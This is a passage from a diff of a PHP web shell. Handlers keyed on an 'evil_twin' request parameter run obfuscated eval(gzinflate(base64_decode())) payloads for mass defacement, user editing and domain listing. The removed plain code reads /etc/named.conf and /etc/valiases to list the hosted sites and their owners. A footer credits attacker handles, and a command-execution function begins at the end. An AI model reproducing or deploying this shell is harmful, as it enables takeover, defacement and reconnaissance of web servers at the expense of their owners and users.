jWjecOQa0bja5iKNMF/nRvOYMWEeuPjazHfu/NNMcqX0Q270r9ucPXx8x4FMudHNJmzLWoiojvkdOUb6HRCP2ER7lum1E4h2mk3SU021pDjyef6MZ4USiEZuqh5kBerI0YwoiZebOq4cODCIOZlULBghC8OECJMrKYEJLwXfcMDBYjx259OnD4nDSPELJGaSQq+67uovbgmaZbK66oWKKd3xSFgmT/wk9rsKAnuThIMcj4NiXuMOi+9+bylZtia9qtqJIpYIpHPTQG1m4W591d7J255ncvHvX0LTj1Da4APfT/jQhBrOmzWm98WeDBfnbXZneCJzb8e6kQ9PX7Ye8Mfy3rw1P0z8SaCJ2uPgv')));
 } elseif($_GET['evil_twin'] == 'mass_deface') {
@@ -190,9 +182,8 @@ eval(gzinflate(base64_decode('7Zx/UxtXlob/d5W/Q0flCriGAHYmv01qMCZxdmJDgb3Z3ThLCd
 } elseif($_GET['evil_twin'] == 'edituser') {
 eval(gzinflate(base64_decode('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')));
 } elseif($_GET['evil_twin'] == 'domains') {
-echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
+eval(gzinflate(base64_decode('ZVLNjtsgEH6VKVkJvFqZ7R7XGPXQPkJPURQRPLaRbLAAr9NGefdCHOeQissw8zH+foy6d0CERhvRS9GYL9CDCqGm45+TO1MpJlCD6WxNVwzd5ro7f1D5043K2ADKNvA7oA+CT5JUL8372q/hR2sGZIRj1NyqEZtSO9uSojIt+7bhiktjEmjj8ct75+ETtLI0gkfVwB6eNsBB8Ds8LbtiFkJFVKcBwTQ1cXOc5kikiB5OnXaD8/VOYz6p12zMBU91vs8r+3zj0UtatS59WPfsoUUFuNfFJZFHj51h5K+zSN62QXGZUvs4qqj7oxoGRncZAISVrwXZ0bdtRS5WBkXVDnPo2c2REP2AlkVvRrYB9t8P+/dDUYCEj+LykokmXycXzPnYYZyW2TTsZrNbLPq7118pNhUwcFI+L6pwTT3JzMqFgt5jW/cxTp+cL8tSPr8pCZf/9wRX8uFfGmdme5ojorfp5iV5KLxeb0FRwdOfJh8B0uof')));
 }
-
 echo "</td></tr>";
 if(isset($_GET['filesrc'])){
 echo "<tr><td>Current File : ";
@@ -348,7 +339,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo "<br><center><a href='mailto:zsec@gmx.com'>Sec666host</a> - <a href='mailto:fadly.randovlsky@gmail.com'>Fadly31337</a></center>
+echo "<br><center><a href='mailto:zsec@gmx.com'>Sec666</a><font color=#B0B0B0> X </font><a href='mailto:fadly.randovlsky@gmail.com'>Fadly31337</a></center>
 </body>
 </html>";
 function exe($cmd) { 	
